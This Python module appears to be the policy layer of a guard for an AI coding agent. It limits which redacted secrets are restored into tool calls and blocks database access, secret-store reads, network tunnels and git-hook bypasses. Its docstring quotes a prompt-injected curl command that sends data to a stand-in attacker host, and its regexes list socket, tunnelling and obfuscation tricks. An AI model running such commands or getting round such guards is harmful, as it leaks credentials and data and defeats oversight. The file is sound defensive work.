"""Tool policy shared by the proxy (response side) and the Claude Code hooks.

Two jobs:

1. Decide which token classes may be *restored* into a tool call's input.
   File-editing and local read tools get everything (otherwise edits to
   .env/values.yaml couldn't round-trip). Shell gets only network identity
   (hosts, IPs, users) - never secrets, so a prompt-injected
   ``curl evil.example?d=RDX_SECRET_...`` can't exfiltrate the real value.
   Web/MCP tools get nothing.

2. Block anything that reads a database.
"""
from __future__ import annotations

import fnmatch
from pathlib import Path
import os
import re
import shlex

from . import vault as V

FILE_TOOLS = {"Edit", "MultiEdit", "Write", "NotebookEdit"}
LOCAL_READ_TOOLS = {"Read", "Grep", "Glob", "LS"}
SHELL_TOOLS = {"Bash", "PowerShell", "Monitor", "BashOutput"}
SHELL_LOCAL_FIELDS = {"command", "cwd"}
REMOTE_TOOLS_GLOBS = ("WebFetch", "WebSearch", "mcp__*")
# Everything else (Agent/Task prompts, TodoWrite, SendMessage, RemoteTrigger, PushNotification,
# MCP resource tools, tools added in future versions) is "other" and gets NOTHING restored:
# a subagent or a todo works fine on tokens, and an unknown tool may send data off the machine.

# Shell gets identities (hosts, IPs, users, emails, names: needed for ssh,
# git commit --author, ...) but never secrets or ID/financial numbers.
SHELL_SAFE = V.NETWORK_IDENTITY_CLASSES | {V.PERSON}

DEFAULT_RESTORE = {
    "file": V.ALL_CLASSES,
    "local_read": V.ALL_CLASSES,
    "shell": SHELL_SAFE,
    "remote": frozenset(),
    "other": frozenset(),
}


def tool_category(name: str) -> str:
    if name in FILE_TOOLS:
        return "file"
    if name in LOCAL_READ_TOOLS:
        return "local_read"
    if name in SHELL_TOOLS:
        return "shell"
    if any(fnmatch.fnmatchcase(name, g) for g in REMOTE_TOOLS_GLOBS):
        return "remote"
    return "other"


# --------------------------------------------------------------------------
# Database access
# --------------------------------------------------------------------------
DB_CLIENTS = {
    "psql", "pg_dump", "pg_dumpall", "pg_restore", "pgcli", "pg_basebackup",
    "mysql", "mysqldump", "mysqlsh", "mysqlpump", "mariadb", "mariadb-dump", "mycli",
    "mongo", "mongosh", "mongodump", "mongoexport", "mongorestore", "mongoimport",
    "redis-cli", "keydb-cli", "valkey-cli", "memcached-tool",
    "sqlite3", "sqlite", "duckdb", "litecli",
    "sqlcmd", "bcp", "isql", "osql", "sqlplus", "rman", "expdp", "impdp",
    "pg_isready", "pg_ctl", "pg_upgrade", "pg_receivewal", "vacuumdb", "reindexdb", "clusterdb",
    "cqlsh", "nodetool", "clickhouse-client", "clickhouse", "influx",
    "cockroach", "usql", "dbcli", "pgbench", "etcdctl", "arangosh",
    "neo4j-shell", "cypher-shell", "trino", "presto", "bq", "snowsql", "athena",
    "atlas", "flyway", "liquibase",
    # Windows GUI / tooling
    "sqllocaldb", "sqlpackage", "ssms", "azuredatastudio", "dbeaver", "heidisql",
    "pgadmin4", "mysqlworkbench", "datagrip", "tableplus", "sqlyog", "navicat",
}
# Program names are compared case-insensitively with these suffixes removed.
_EXE_SUFFIX_RE = re.compile(r"\.(?:exe|cmd|bat|com|ps1)$", re.I)
_PATH_QUALIFIED_CLIENT_RE = re.compile(
    r"(?i)[\\/](" + "|".join(re.escape(c) for c in sorted(DB_CLIENTS, key=len, reverse=True))
    + r")(?:\.(?:exe|cmd|bat|ps1))?(?=[\s\"'|;&)]|$)")
DB_URI_RE = re.compile(
    r"\b(?:postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|redis(?:s)?|rediss|"
    r"sqlserver|mssql|oracle|cassandra|clickhouse|cockroachdb|couchdb|neo4j|"
    r"bolt|amqp|jdbc:[a-z0-9]+)://", re.I)
DB_LIB_RE = re.compile(
    r"-m\s+sqlite3\b|\bimport\s+sqlite3\b|\bfrom\s+sqlite3\b|__import__\s*\(|\bimportlib\b|"
    r"\b(?:psycopg2?|asyncpg|pg8000|pymysql|mysql\.connector|MySQLdb|aiomysql|"
    r"pymongo|motor|redis\.Redis|aioredis|sqlite3\.connect|sqlalchemy\.create_engine|"
    r"create_engine\(|cx_Oracle|oracledb|pyodbc|cassandra\.cluster|clickhouse_driver|"
    r"knex|sequelize|mongoose\.connect|new\s+Pool\(|pg\.Client|prisma\s+(?:db|studio)|"
    r"typeorm|drizzle-kit\s+studio|duckdb\.connect)", re.I)
# PowerShell / .NET / COM / ODBC database access, and Windows integrated auth
# (which needs no password at all, so secret redaction can't help there).
WIN_DB_RE = re.compile(
    r"(?i)\b(?:Invoke-Sqlcmd|Invoke-DbaQuery|Invoke-DbaDb\w*|Connect-DbaInstance|"
    r"Get-DbaDatabase|Export-DbaScript|Invoke-SqlQuery|Open-SqlConnection|"
    r"Get-OdbcDsn|Add-OdbcDsn|Set-OdbcDsn|ADODB\.(?:Connection|Recordset)|"
    r"Integrated\s+Security\s*=|Trusted_Connection\s*=|Initial\s+Catalog\s*=|"
    r"Data\s+Source\s*=[^;]*;|Server\s*=[^;]*;\s*Database\s*=)")
# .NET data providers count only when the command loads or instantiates them
# (so `Select-String -Pattern SqlConnection` over source code stays allowed).
WIN_DB_LIB_RE = re.compile(
    r"(?i)(?:System|Microsoft)\.Data\.(?:SqlClient|Odbc|OleDb|Sqlite|SQLite)|Npgsql|MySql\.Data|"
    r"MySqlConnector|Oracle\.ManagedDataAccess|SqlConnection|OdbcConnection|OleDbConnection")
WIN_INSTANTIATE_RE = re.compile(r"(?i)New-Object|::new\(|Add-Type|CreateInstance|::GetType\(|\[Reflection\.Assembly\]::Load|"
                                r"\[System\.Reflection\.Assembly\]::Load|Import-Module\s+(?:SqlServer|dbatools)")
# Cloud data-plane commands that read database contents (control-plane ops are fine).
CLOUD_DB_RE = re.compile(
    r"(?i)\baws\s+(?:--?[\w\-]+(?:[ =](?!-)\S+)?\s+)*(?:dynamodb\s+(?:scan|query|get-item|batch-get-item|execute-statement|"
    r"batch-execute-statement|execute-transaction|export-table-to-point-in-time)|"
    r"rds-data\s|redshift-data\s|athena\s+(?:start-query-execution|get-query-results)|"
    r"timestream-query\s|neptunedata\s|neptune-graph\s+execute-query|"
    r"keyspaces\s+.*select|qldb-session\s)|"
    r"\bgcloud\s+(?:sql\s+(?:connect|export|import)|spanner\s+databases\s+execute-sql|"
    r"firestore\s+(?:export|documents)|bigtable\s+.*read)|"
    r"\baz\s+(?:(?:postgres|mysql)\s+flexible-server\s+(?:connect|execute)|"
    r"cosmosdb\s+.*query|sql\s+db\s+query)|\bcbt\s+(?:read|lookup)")
K8S_DB_RE = re.compile(
    r"\b(?:kubectl|k|oc|kubecolor)\b\s.*\b(?:exec|port-forward|cp|attach|debug)\b|"
    r"\b(?:docker|podman|nerdctl)\b(?:\s+compose)?\s+(?:exec|attach|cp)\b|"
    r"\bdocker-compose\s+(?:exec|run)\b", re.I)
SECRET_MATERIAL_RE = re.compile(
    r"\bkubectl\b.*\bget\s+secrets?\b.*(?:-o|--output)|"
    r"\bkubectl\b.*\bdescribe\s+secrets?\b|"
    r"\bbase64\s+(?:-\w*[dD]\w*|--decode)\b|"
    r"\b(?:vault\s+(?:kv\s+)?(?:read|get)|aws\s+secretsmanager\s+get-secret-value|"
    r"aws\s+ssm\s+get-parameters?\b.*--with-decryption|"
    r"gcloud\s+secrets\s+versions\s+access|az\s+keyvault\s+secret\s+show|"
    r"op\s+(?:read|item\s+get)|sops\s+(?:-d|--decrypt|decrypt))\b|"
    # Windows credential stores / DPAPI
    r"\b(?:cmdkey|vaultcmd)\b|Get-StoredCredential|Get-Secret\b|"
    r"ProtectedData\]?::Unprotect|ConvertFrom-SecureString|"
    r"GetNetworkCredential\(\)|FromBase64String", re.I)
GIT_HOOK_BYPASS_RE = re.compile(
    r"\bgit\b[^|;&\n]*?(?:\s--no-verify\b|\s-c\s+core\.hookspath\b|\s--config-env[= ]core\.hookspath|"
    r"\scommit\b[^|;&\n]*?\s-[a-zA-Z]*n[a-zA-Z]*\b)|\bGIT_CONFIG_(?:COUNT|KEY_\d+)\b|"
    r"\bgit\b[^|;&\n]*?\sconfig\b[^|;&\n]*?\score\.hookspath\b", re.I)
ENCODED_PS_RE = re.compile(r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b.*\s[-/](?:e|ec|en[a-z]*)\s")
DB_FILE_GLOBS = (
    "*.sqlite", "*.sqlite3", "*.db", "*.db3", "*.s3db", "*.sl3", "*.mdb", "*.accdb",
    "*.dump", "*.pgdump", "*.bak", "*.ibd", "*.frm", "*.myd", "*.myi", "*.wiredtiger",
    "*.rdb", "*.aof", "*.mdf", "*.ldf", "*.ndf", "*.duckdb", "*.parquet.db",
    ".pgpass", ".my.cnf", ".mylogin.cnf", "pg_service.conf", ".dbshell", ".mongorc.js",
    ".psql_history", ".mysql_history", ".rediscli_history", ".sqlite_history",
    # Windows
    "pgpass.conf", "my.ini", "sqlstudio.bin", "*.udl", "*.dsn", "psql_history",
    # SQLite side files, backups and dumps
    "*.db-wal", "*.db-shm", "*.db-journal", "*.sqlite-wal", "*.sqlite-shm", "*.sqlite-journal",
    "*.sqlite3-wal", "*.sqlite3-journal", "*.sqlite.backup", "*.sqlite.bak", "*.db.bak*",
    "*dump*.sql", "*backup*.sql", "*.sql.gz", "*.sql.bz2", "*.sql.xz", "*.sql.zst",
    "*.dump.gz", "*.pgdump.gz",
)
# Running something INDIRECTLY: a DB client named anywhere in such a command is blocked
# (echo 'psql ..' | sh, python -c "subprocess.run(['ps'+'ql'..])", docker run .. psql, iex ..).
INDIRECT_RE = re.compile(
    r"(?i)\|\s*(?:sudo\s+)?(?:ba|z|da|k|fi)?sh\b|\|\s*(?:pwsh|powershell|cmd|iex|python3?|node|perl|ruby)\b|"
    r"<<<|\b(?:sh|bash|zsh|dash|busybox|python3?|py|node|perl|ruby|php|deno|bun|osascript)\b[^|;&]*\s-[a-z]*[ce]\b|"
    r"\bsubprocess\b|\bchild_process\b|\bos\.(?:system|popen|exec\w*)|\bexec(?:Sync|File|v?p?e?)?\s*\(|"
    r"\bsystem\s*\(|\bspawn\w*\s*\(|\bPopen\b|Invoke-Expression|\biex\b|Start-Process|&\s*\(|"
    r"\.Invoke\(|\bxargs\b|\bfind\b[^|;&]*-exec|\benv\s+-S|\beval\b|\balias\b|\bexec\s+[\"'\[]|"
    r"\$\(|`|"
    r"\b(?:docker|podman|nerdctl)\s+(?:container\s+)?(?:run|create)\b|\b(?:kubectl|k|oc)\s+run\b|"
    r"\bwsl(?:\.exe)?\b|\bcmd(?:\.exe)?\s+/[ck]")
RAW_SOCKET_RE = re.compile(r"(?i)(?:^|[\s;&|(])(?:nc|ncat|netcat|socat|telnet|openssl\s+s_client|"
                           r"websocat|grpcurl)(?:\.exe)?\s")
SSH_FORWARD_RE = re.compile(r"(?i)\b(?:ssh|plink|autossh)(?:\.exe)?\b[^|;&]*\s-[a-zA-Z]*[LRDw]\s*\S|"
                            r"\bsshuttle\b|\bchisel\b|\bngrok\b|\bcloudflared\s+access\b")
HTTP_DB_RE = re.compile(r"(?i)https?://[^/\s'\"]+:(?:8123|5984|6984|9200|9300|8086|7474|8529|2379|8091|8529|"
                        r"4000|7000|8000|9000|27017|28017|6363)\b|\.supabase\.co/(?:rest|graphql|pg)|"
                        r"\.firebaseio\.com|\.documents\.azure\.com|/_all_dbs|/_search\b|/_sql\b")
# a variable in the command-name position: P=psq; ${P}l   $CMD -h db   $(which psql) -h db
DYNAMIC_CMD_RE = re.compile(r"(?:^|[;&|]|&&|\|\||\$\(|\bthen\b|\bdo\b)\s*(?:[A-Za-z_]\w*=\S*\s+)*"
                            r"[^\s;&|$'\"]*\$(?:\{?[A-Za-z_]\w*\}?|\()")


def _normalized(cmd: str) -> str:
    """Undo cheap obfuscation: cmd carets, backslashes inside words, string concatenation."""
    t = re.sub(r"\^(?=\w)", "", cmd)
    t = re.sub(r"(?<=\w)\\(?=\w)", "", t)
    for _ in range(6):
        t2 = re.sub(r"([\"'])([^\"'\n]{0,40})\1\s*(?:\+|\.)\s*([\"'])([^\"'\n]{0,40})\3", r"\1\2\4\1", t)
        if t2 == t:
            break
        t = t2
    return t
DB_DIR_PARTS = ("pgdata", "postgresql/data", "var/lib/mysql", "var/lib/postgresql",
                "var/lib/mongodb", "data/db", "mongo-data", "redis-data", "mysql-data",
                "microsoft sql server", "programdata/mysql", "mongodb/server")
_PG_WIN_DATA_RE = re.compile(r"(?i)/postgresql/\d+(?:\.\d+)?/data(?:/|$)")
GUARD_PATH_PARTS = ("redact-guard/vault", "redact-guard/key", ".config/redact-guard",
                    ".local/share/redact-guard", "programdata/redact-guard/state",
                    "var/lib/redact-guard", "redact-guard/state")
# Concrete guard paths that a glob in a command might expand to (~/.conf*/redact-gu*/key).
_GUARD_GLOB_TARGETS = ("~/.config/redact-guard/key", "~/.local/share/redact-guard/vault.bin",
                       "~/.local/share/redact-guard/mitm/mitmproxy-ca.pem",
                       "c:/programdata/redact-guard/state/key", "/var/lib/redact-guard/key")
_SHORT_NAME_RE = re.compile(r"(?i)\bredact~\d|\bredac~\d")


def _guard_glob_hit(cmd: str) -> bool:
    """A glob or 8.3 short name in the command that could reach the vault or key."""
    if _SHORT_NAME_RE.search(cmd):
        return True
    home = os.path.expanduser("~").replace("\\", "/").lower()
    targets = [t.replace("~", home) for t in _GUARD_GLOB_TARGETS]
    for tok in re.findall(r"[^\s'\"<>|;&()=,]+", cmd):
        if not any(c in tok for c in "*?["):
            continue
        t = tok.replace("\\", "/").lower()
        t = re.sub(r"^(?:~|\$home|\$env:userprofile|%userprofile%|\$\{home\})", home, t)
        for target in targets:
            # a full-path glob that matches, or a fragment glob (-path '*redact*') inside one
            if fnmatch.fnmatchcase(target, t) or fnmatch.fnmatchcase(target, "*" + t.strip("*") + "*") \
                    and ("red" in t or "guard" in t or "vault" in t):
                return True
    return False


_WRAPPERS = {"sudo", "doas", "env", "exec", "nohup", "time", "command", "xargs", "nice",
             "ionice", "timeout", "stdbuf", "watch", "su", "runuser", "chroot", "unbuffer",
             "strace", "ltrace", "setsid", "flock", "caffeinate", "start", "start-process",
             "invoke-expression", "iex", "&", "."}
_WRAPPER_ARG_OPTS = {"-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "-n", "-s", "-k",
                     "--user", "--group", "-o", "-I", "-L", "-P", "-filepath", "-argumentlist"}
_INNER_SHELLS = {"bash", "sh", "zsh", "dash", "fish", "cmd", "powershell", "pwsh", "wsl"}
_INNER_FLAGS = {"-c", "/c", "/k", "-command", "-commandwithargs", "--", "-e", "--exec"}


def _prog_name(word: str) -> str:
    base = re.split(r"[\\/]", word.strip("\"'"))[-1]
    return _EXE_SUFFIX_RE.sub("", base).lower()


def _split_unquoted(cmd: str) -> list[str]:
    """Split at shell operators (; | || && & newline ( ) { } $( and backticks) that are NOT
    inside quotes: `rg 'jdbc:(mysql|postgresql)'` is one command, not three."""
    parts, cur, q, i = [], [], None, 0
    while i < len(cmd):
        c = cmd[i]
        if q:
            cur.append(c)
            if c == q:
                q = None
            elif c == "\\" and q == '"' and i + 1 < len(cmd):
                cur.append(cmd[i + 1])
                i += 1
        elif c in "'\"":
            q = c
            cur.append(c)
        elif c == "\\" and i + 1 < len(cmd):        # escaped char (bash) - keep both
            cur += [c, cmd[i + 1]]
            i += 1
        elif cmd.startswith("{}", i):                  # find -exec {} / xargs -I{}: a word, not a group
            cur += ["{", "}"]
            i += 1
        elif cmd.startswith(("||", "&&", "$("), i):
            parts.append("".join(cur)); cur = []
            i += 1
        elif c in ";|\n()`{}" or (c == "&" and not (i and cmd[i - 1] in "<>")):
            parts.append("".join(cur)); cur = []
        else:
            cur.append(c)
        i += 1
    parts.append("".join(cur))
    return parts


# Searching FOR a database name is fine; running a client is not. Arguments of these programs
# (grep patterns, file globs) are ignored when looking for client names.
SEARCH_TOOLS = {"grep", "egrep", "fgrep", "rg", "ag", "ack", "git", "findstr", "select-string", "sls",
                "sed", "awk", "gawk", "cut", "head", "tail", "cat", "type", "less", "more", "wc", "sort",
                "uniq", "tr", "jq", "yq", "xmllint", "get-content", "gc", "get-childitem", "gci", "ls",
                "dir", "find", "fd", "tree", "where-object", "?", "foreach-object", "%", "measure-object",
                "out-string", "format-table", "ft", "echo-not", "diff", "comm", "column", "nl", "printf-not",
                "mvn", "gradle", "gradlew", "./gradlew", "./mvnw", "mvnw", "npm", "yarn", "pnpm"}


def _client_scan_text(cmd: str) -> str:
    """The command with search/read tools' arguments removed (find -exec grep counts as search)."""
    keep = []
    for words in _split_commands(cmd):
        prog = _prog_name(words[0]) if words else ""
        if prog in SEARCH_TOOLS:
            if prog == "find" and "-exec" in [w.lower() for w in words]:
                after = words[[w.lower() for w in words].index("-exec") + 1:]
                if after and after[0].startswith("{}"):
                    keep.append(" ".join(words))        # -exec {} runs what find found: check it all
                elif after and _prog_name(after[0]) not in SEARCH_TOOLS:
                    keep.append(" ".join(after))
            continue
        keep.append(" ".join(words))
    return "\n".join(keep)


_BLOCKED_CMD_RE = re.compile(r"printf '%s\\n' '(?:[^']|'\"'\"')*' >&2; exit 126")


def _split_commands(cmd: str) -> list[list[str]]:
    """Split a shell line (bash, PowerShell or cmd) into simple commands (best effort)."""
    parts = _split_unquoted(cmd)
    out = []
    for p in parts:
        p = p.strip()
        if not p:
            continue
        try:
            words = shlex.split(p, posix=("\\" not in p))
        except ValueError:
            words = p.split()
        # drop env assignments and wrappers (sudo -u postgres psql, timeout 5 psql,
        # Start-Process psql, & "C:\...\psql.exe", ...)
        while words:
            if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", words[0]) or \
                    re.fullmatch(r"\$env:[A-Za-z_]\w*=.*", words[0], re.I):
                words = words[1:]
                continue
            if _prog_name(words[0]) in _WRAPPERS:
                words = words[1:]
                while words and (words[0].startswith("-") or re.fullmatch(r"\d+(?:\.\d+)?[smhd]?", words[0])):
                    opt = words.pop(0)
                    if opt.lower() in _WRAPPER_ARG_OPTS and words and opt.lower() != "-filepath":
                        words.pop(0)
                continue
            break
        if words:
            out.append([w.strip("\"'") for w in words])
    return out


_CLIENT_WORD_RE = re.compile(r"(?i)(?<![\w\-./])(" + "|".join(re.escape(c) for c in sorted(DB_CLIENTS, key=len, reverse=True))
                             + r")(?:\.exe)?(?![\w\-])")


def check_shell_command(cmd: str) -> str | None:
    """Return a reason string if the command must be blocked. Covers bash, PowerShell, cmd.
    Best effort by nature: the network boundary (sandbox / firewall / container) is what
    actually keeps network databases out of reach."""
    if _BLOCKED_CMD_RE.fullmatch(cmd.strip()):
        return None                     # redact-guard's own "blocked" message: harmless
    if ENCODED_PS_RE.search(cmd + " "):
        return "encoded PowerShell commands can't be inspected and are not allowed"
    norm = _normalized(cmd)
    if norm != cmd:
        r = check_shell_command_plain(norm)
        if r:
            return r
    return check_shell_command_plain(cmd)


def check_shell_command_plain(cmd: str) -> str | None:
    if INDIRECT_RE.search(cmd):
        m = _CLIENT_WORD_RE.search(_client_scan_text(cmd))
        if m:
            return f"database client `{m.group(1).lower()}` run indirectly is not allowed"
    if DYNAMIC_CMD_RE.search(cmd):
        return "commands whose name comes from a variable can't be checked and are not allowed"
    if re.search(r"\$'[^']*\\[0-7xuU]", cmd):
        return "escape-encoded ($'\\x..') commands can't be checked and are not allowed"
    if RAW_SOCKET_RE.search(" " + cmd):
        return "raw socket tools (nc, socat, telnet, ...) are not allowed (database access path)"
    if SSH_FORWARD_RE.search(cmd):
        return "SSH port forwarding / tunnels are not allowed (database access path)"
    if HTTP_DB_RE.search(cmd):
        return "HTTP database APIs are not allowed from the shell"
    for words in _split_commands(cmd):
        first = words[0].split()[0] if words[0].split() else ""
        prog = _prog_name(first)
        if prog in DB_CLIENTS:
            return f"database client `{prog}` is not allowed"
        if prog in _INNER_SHELLS and len(words) > 1:
            rest = words[1:]
            while rest and rest[0].lower() in ("-noprofile", "-nop", "-noninteractive", "-noni",
                                               "-executionpolicy", "bypass", "-ep", "/s", "/q",
                                               "-nologo", "-l", "--login", "-i"):
                rest = rest[1:]
            if rest and rest[0].lower() in _INNER_FLAGS:
                rest = rest[1:]
            if rest:
                inner = check_shell_command(" ".join(rest))
                if inner:
                    return inner
    m = _PATH_QUALIFIED_CLIENT_RE.search(cmd)
    if m:
        return f"database client `{m.group(1).lower()}` is not allowed"
    if DB_URI_RE.search(cmd):
        return "database connection URIs are not allowed in shell commands"
    if DB_LIB_RE.search(cmd) or WIN_DB_RE.search(cmd) or \
            (WIN_DB_LIB_RE.search(cmd) and WIN_INSTANTIATE_RE.search(cmd)):
        return "inline database driver code / connection strings are not allowed"
    if CLOUD_DB_RE.search(cmd):
        return "reading database contents through cloud CLIs is not allowed"
    if K8S_DB_RE.search(cmd):
        return "exec/port-forward/cp into containers or pods is not allowed (database access path)"
    if GIT_HOOK_BYPASS_RE.search(cmd):
        return "skipping git hooks (--no-verify / core.hooksPath) is not allowed; they block placeholders"
    if SECRET_MATERIAL_RE.search(cmd):
        return "reading or decoding secret material from secret stores is not allowed"
    low = cmd.lower().replace("\\", "/")
    for part in GUARD_PATH_PARTS:
        if part in low:
            return "access to the redact-guard vault/key is not allowed"
    if _guard_glob_hit(cmd):
        return "access to the redact-guard vault/key is not allowed (glob or short name)"
    for tok in re.findall(r"[^\s'\"<>|;&]+", cmd):
        r = check_path(tok)
        if r:
            return r
    return None


def check_path(path: str) -> str | None:
    if not path:
        return None
    p = path.replace("\\", "/")
    low = p.lower()
    base = low.rsplit("/", 1)[-1]
    for g in DB_FILE_GLOBS:
        if fnmatch.fnmatchcase(base, g):
            return f"database files ({g}) are not readable"
    for part in DB_DIR_PARTS:
        if f"/{part}/" in f"/{low}/" or low.endswith(part):
            return "database data directories are not readable"
    if _PG_WIN_DATA_RE.search(low):
        return "database data directories are not readable"
    for part in GUARD_PATH_PARTS:
        if part in low:
            return "access to the redact-guard vault/key is not allowed"
    return None


MCP_DB_RE = re.compile(r"(?i)(postgres|mysql|maria|mongo|redis|sqlite|sql|database|db_|_db|__pg__|_pg_|psql|"
                       r"supabase|neon|planetscale|dynamo|firestore|bigquery|snowflake|"
                       r"clickhouse|cassandra|elastic|opensearch|prisma)")


def check_tool(name: str, tool_input: dict) -> str | None:
    """Unified check used by hooks and the proxy. Returns a block reason or None."""
    if name in SHELL_TOOLS:
        cmd = tool_input.get("command")
        if not isinstance(cmd, str):
            return "shell tool input without a command string (unknown format)"
        return check_shell_command(cmd)
    if name in FILE_TOOLS or name in LOCAL_READ_TOOLS:
        for k in ("file_path", "path", "notebook_path", "pattern", "glob"):
            v = tool_input.get(k)
            if isinstance(v, str):
                r = check_path(v)
                if r and not (k == "pattern" and name == "Grep"):
                    return r
        return None
    if name.startswith("mcp__") and MCP_DB_RE.search(name):
        return f"MCP tool `{name}` looks like a database tool"
    # any other tool (MCP tools, MCP resource readers): no DB URIs, no SQL in query fields
    for k, v in _flat_strings(tool_input):
        if DB_URI_RE.search(v):
            return f"`{name}` input contains a database URI"
        if k.lower() in ("sql", "query", "statement", "stmt", "q") and SQL_RE.search(v):
            return f"`{name}` input looks like a SQL query"
    return None


SQL_RE = re.compile(r"(?is)\b(?:select\b.+\bfrom|insert\s+into|update\s+\w+\s+set|delete\s+from|"
                    r"create\s+table|drop\s+table|alter\s+table|show\s+(?:tables|databases))\b")


def _flat_strings(o, key=""):
    if isinstance(o, str):
        yield key, o
    elif isinstance(o, dict):
        for k, v in o.items():
            yield from _flat_strings(v, str(k))
    elif isinstance(o, list):
        for x in o:
            yield from _flat_strings(x, key)


BLOCKED_SECRET_MSG = (
    "redact-guard: this command referenced a redacted secret or ID number ({tokens}). These are "
    "never substituted into shell commands. Reference the value through an environment variable "
    "(e.g. \"$DB_PASSWORD\") or a config file instead.")
BLOCKED_REASON_MSG = "redact-guard: blocked - {reason}."


def blocked_command(message: str) -> str:
    return "printf '%s\\n' " + shlex.quote(message) + " >&2; exit 126"


# --------------------------------------------------------------------------
# Local database files, recognised by content (any name: reports.dat, x.backup)
# --------------------------------------------------------------------------
DB_MAGIC = (
    (b"SQLite format 3\x00", "SQLite"),
    (b"PGDMP", "PostgreSQL custom dump"),
    (b"REDIS", "Redis RDB"),
    (b"\x00\x06\x15\x61", "Berkeley DB"),
    (b"\x00\x01\x00\x00Standard Jet DB", "Access"),
    (b"\x00\x01\x00\x00Standard ACE DB", "Access"),
    (b"DUCK", "DuckDB"),
    (b"\x01\x0f\x00\x00", "SQL Server MDF"),
)
_SCRIPT_EXT_RE = re.compile(r"(?i)\.(?:py|pyw|js|mjs|cjs|ts|ps1|psm1|sh|bash|rb|pl|php|go|java|kt|"
                            r"cs|fsx|csx|r|lua|bat|cmd|sql)$")
_PATHISH_RE = re.compile(r"[\w~.$%:\\/\-]*[./\\][\w~.$%:\\/\-]*|[\w\-]{3,}")
STATE_DIR = Path(os.environ.get("LOCALAPPDATA") or "~/.cache").expanduser() / "redact-guard"


def db_magic(path: Path) -> str | None:
    try:
        if not path.is_file():
            return None
        with open(path, "rb") as f:
            head = f.read(112)
    except OSError:
        return None
    for magic, kind in DB_MAGIC:
        if head.startswith(magic):
            return kind
    if len(head) >= 100 and head[96:100] in (b"\x00\x00\x00\x00",) and head[:16].startswith(b"SQLite"):
        return "SQLite"
    return None


def _cwd(tool_input: dict) -> Path:
    return Path(os.environ.get("CLAUDE_PROJECT_DIR") or os.getcwd())


def _resolve(tok: str, base: Path) -> Path | None:
    t = os.path.expandvars(os.path.expanduser(tok.strip("\"'`,;()")))
    if not t or len(t) > 400:
        return None
    p = Path(t)
    return p if p.is_absolute() else base / p


def _db_scripts_file() -> Path:
    return STATE_DIR / "db-scripts.txt"


def remember_db_script(path: str) -> None:
    try:
        STATE_DIR.mkdir(parents=True, exist_ok=True)
        with open(_db_scripts_file(), "a", encoding="utf-8") as f:
            f.write(Path(path).name.lower() + "\n")
    except OSError:
        pass


def _known_db_scripts() -> set[str]:
    try:
        return {x.strip() for x in _db_scripts_file().read_text(encoding="utf-8").splitlines() if x.strip()}
    except OSError:
        return set()


def check_local_files(name: str, tool_input: dict) -> str | None:
    """Hook-only checks that need the local disk: database files by magic bytes (whatever
    their name), and running a script that Claude wrote with database driver code."""
    base = _cwd(tool_input)
    if name in FILE_TOOLS or name in LOCAL_READ_TOOLS:
        for k in ("file_path", "path", "notebook_path"):
            v = tool_input.get(k)
            if isinstance(v, str):
                p = _resolve(v, base)
                kind = p and db_magic(p)
                if kind:
                    return f"{v} is a {kind} database file; database contents are not readable"
        if name in ("Write", "Edit", "MultiEdit"):
            content = " ".join(str(tool_input.get(k) or "") for k in ("content", "new_string"))
            for e in tool_input.get("edits") or []:
                if isinstance(e, dict):
                    content += " " + str(e.get("new_string") or "")
            path = str(tool_input.get("file_path") or "")
            if _SCRIPT_EXT_RE.search(path) and (DB_LIB_RE.search(content) or DB_URI_RE.search(content)):
                remember_db_script(path)     # editing is fine; running it from the shell is not
        return None
    if name in SHELL_TOOLS:
        cmd = tool_input.get("command")
        if not isinstance(cmd, str):
            return None
        known = _known_db_scripts()
        seen = 0
        for tok in _PATHISH_RE.findall(cmd):
            low = tok.strip("\"'`").replace("\\", "/").lower()
            if known and low.rsplit("/", 1)[-1] in known:
                return (f"{tok} contains database driver code that Claude wrote; "
                        f"running it would read database contents")
            p = _resolve(tok, base)
            if p is None:
                continue
            seen += 1
            if seen > 60:
                break
            kind = db_magic(p)
            if kind:
                return f"{tok} is a {kind} database file; database contents are not readable"
    return None
